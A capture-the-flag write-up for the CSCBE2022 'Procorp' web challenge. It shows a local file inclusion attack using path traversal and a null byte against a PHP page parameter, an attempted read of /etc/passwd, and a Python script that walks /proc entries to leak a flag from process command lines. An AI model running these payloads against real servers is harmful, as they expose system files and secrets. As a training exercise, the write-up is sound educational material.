# CSCBE2022 - Procorp

## Web - Medium

In this challenge we were given a website talking about Procorp, a process manager. 
![](https://i.imgur.com/ySP8Itm.png)

We can't find anything really interesting on the website, except for a Guide page that talks about a simple way to use this process manager.

![](https://i.imgur.com/JzOBzSH.png)

Looking at the pastebin URL, we obviously find a fake flag. From here we can see that the flag is set by passing it as an argument to the process manager with the f option.

We can also see that the URL of this Guide webpage is included as follows.
`52.50.60.154/index.php?p=guide`

From this point on, we can think of a classic LFI attack.

As the main file for the website is `index.php`, it appears that `.php` is added to the file name passed to the `?p` parameter. To get around this, we need to add a null byte (`%00`) to the file we are trying to include.

So let's start by trying to include the other files that already exist.

`http://52.50.60.154/index.php?p=../html/pricing` (.php is appended to pricing to include pricing.php)
![](https://i.imgur.com/E03Dggl.png)
Here we can see two things:

- We are probably in the /var/www/html directory
- The LFI works

Let's continue by trying to include classic files such as /etc/passwd
`http://52.50.60.154/index.php?p=../../../../../../../../../../../etc/passwd%00` (remember about the null byte so that the .php extension is not added)
![](https://i.imgur.com/2cKwXpI.png)

We are not allowed to include files from the /etc directory.
So we kept trying to include different files from various directories but we weren't allowed to so. Except for a directory, /proc.
This special directory holds all the details about your Linux system, including its kernel, processes, and configuration parameters.

By reading documentation on proc files, we can see that some might be interesting to include.
https://tldp.org/LDP/Linux-Filesystem-Hierarchy/html/proc.html

/proc/PID/stat

> Process status.
> /proc/PID/stat files also displays the name of the process

/proc/PID/cmdline

> Command line arguments.
> This seems interesting considering that procorp is supposed to be run with the flag as a command line argument 


Let's try it.
`http://52.50.60.154/index.php?p=../../../../../../../../../../../proc/1/status%00`
![](https://i.imgur.com/Oy2ZvNW.png)

From here we can see that the name of the first process is `entrypoint.sh`. But let's see if we can find a more interesting process. To do this, we'll create a quick and dirty script that looks at the status of all the pids.


```python
import requests
url = "http://52.50.60.154/index.php?p=../../../../../../../../../../../proc/"

for i in range(1000):
	a = requests.get(url+str(i)+"/status%00")
	print("testing : ", i)
	
	if "Quickly manage your processes!" not in a.text:
		a = str(a.content)
		a = a.split("Name:")
		a = a[1]
		a = a.split("Umask")
		print(a[0])
```

We run it and we can see that procorp is running on different pids. 

![](https://i.imgur.com/g1VV0KZ.png)

Let's choose one and include its command line arguments.
`http://52.50.60.154/index.php?p=../../../../../../../../../../../proc/7/cmdline%00`
And the flag is there :)

![](https://i.imgur.com/hLThpz2.png)


That's just how we first blooded this interesting and fun challenge.
